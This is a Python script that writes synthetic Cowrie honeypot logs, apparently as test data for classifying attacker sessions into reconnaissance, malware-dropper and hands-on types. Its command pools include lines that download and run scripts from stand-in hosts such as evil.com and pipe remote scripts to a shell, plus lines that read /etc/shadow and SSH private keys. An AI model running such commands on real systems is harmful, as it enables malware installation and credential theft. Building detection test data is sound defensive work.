import json
import random
import uuid
from datetime import datetime, timedelta

def generate_fake_logs(filename, num_recon=100, num_dropper=100, num_human=100):
    recon_commands_pools = [
        ["ls", "pwd", "whoami"],
        ["ps aux", "top -n 1", "free -m"],
        ["uname -a", "cat /proc/cpuinfo", "exit"],
        ["cd /var/log", "tail -n 10 syslog", "exit"],
        ["id", "history -c", "exit"]
    ]

    dropper_commands_pools = [
        ["cd /tmp", "wget http://malicious-ip.com/bot.sh", "chmod +x bot.sh", "./bot.sh"],
        ["wget -q -O - http://185.11.22.33/miner.sh | sh"],
        ["cd /dev/shm", "curl -O http://bad-domain.xyz/payload.bin -o update", "chmod +x update", "./update &", "rm -rf update"],
        ["wget http://evil.com/mirai.arm; chmod +x mirai.arm; ./mirai.arm"],
        ["curl http://persistent-threat.com/reverse.sh | bash"]
    ]
    
    human_commands_pools = [
        ["cd /tmp", "ls -la", "cat /etc/issue"],
        ["cd /etc", "cat passwd", "cat shadow", "exit"],
        ["cd ~/.ssh", "cat id_rsa", "cat authorized_keys"],
        ["find / -name '*password*' -type f", "ls -la", "exit"],
        ["netstat -tulpn", "cd /etc", "ls -la /var/www/html"]
    ]

    events = []
    base_time = datetime(2026, 4, 7, 12, 0, 0)
    
    def generate_session(num_sessions, pools):
        nonlocal base_time
        for i in range(num_sessions):
            session_id = uuid.uuid4().hex[:8]
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            events.append({"eventid": "cowrie.session.connect", "src_ip": ip, "session": session_id, "timestamp": base_time.isoformat() + "Z"})
            base_time += timedelta(seconds=2)
            events.append({"eventid": "cowrie.login.success", "username": "root", "password": "123", "session": session_id, "timestamp": base_time.isoformat() + "Z"})
            
            cmd_pool = random.choice(pools)
            for cmd in cmd_pool:
                base_time += timedelta(seconds=random.randint(1, 5))
                events.append({"eventid": "cowrie.command.input", "input": cmd, "duration": 1.0, "session": session_id, "timestamp": base_time.isoformat() + "Z"})
                
            base_time += timedelta(seconds=2)
            events.append({"eventid": "cowrie.session.closed", "duration": 10.0, "session": session_id, "timestamp": base_time.isoformat() + "Z"})

    generate_session(num_recon, recon_commands_pools)
    generate_session(num_dropper, dropper_commands_pools)
    generate_session(num_human, human_commands_pools)

    with open(filename, 'w') as f:
        for event in events:
            f.write(json.dumps(event) + "\n")
            
    print(f"Generated {num_recon + num_dropper + num_human} sessions in {filename}")

if __name__ == '__main__':
    generate_fake_logs("fake_logs.json", 100, 100, 100)
